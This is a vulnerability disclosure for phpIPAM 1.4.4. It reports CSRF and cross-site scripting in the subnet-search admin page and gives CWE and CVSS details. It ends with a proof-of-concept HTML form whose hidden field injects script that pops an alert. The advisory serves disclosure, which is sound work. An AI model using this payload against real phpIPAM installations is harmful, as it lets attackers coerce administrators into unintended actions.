=====[ Vulnerability Information
]=============================================

* Class: Improper Neutralization of Input During Web Page Generation
('Cross-Site Scripting') [CWE-79]
* CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L

* Class: Cross-Site Request Forgery (CSRF) [CWE-352]
* CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L


=====[ Overview ]========================================================

 * System affected: PHPIPAM - Version 1.4.4
 * Software Version: Version 1.4.4 (other versions may also be affected).
 * Impact: PHPIPAM 1.4.4 is vulnerable to Cross-Site Request Forgery (CSRF)
and Cross-Site Scripting (XSS) via
app/admin/subnets/find_free_section_subnets.php. An attacker can exploit
this by injecting javascript code to coerce an admin user into performing
unintended actions.

=====[ Detailed description
]=================================================

The html codes below exploit vulnerabilities in the same way due to the
fact that both forms do not contain CSRF tokens and are vulnerable to XSS
attacks. Then an attacker can host the forms on their malicious host and
trick an administrator into visiting your page. If successful, the
javascript code will execute.

* [app/admin/subnets/find_free_section_subnets.php]

<html>
  <body>
    <h1> Exploit PHPIPAM </h1>
  <script>history.pushState('', '', '/')</script>
    <form action="
http://127.0.0.1:8082/app/admin/subnets/find_free_section_subnets.php"
method="POST">
      <input type="hidden" name="container" value="body" />
      <input type="hidden" name="placement" value="top" />
      <input type="hidden" name="sectionid" value="2'><input
onpointerleave="alert(1)">rodnt</input><script>alert('incogbyte')</script>"
/>
      <input type="hidden" name="original-title" value="Search for free
subnets in section " />
      <input type="submit" value="Exploit" />
    </form>
  </body>
</html>
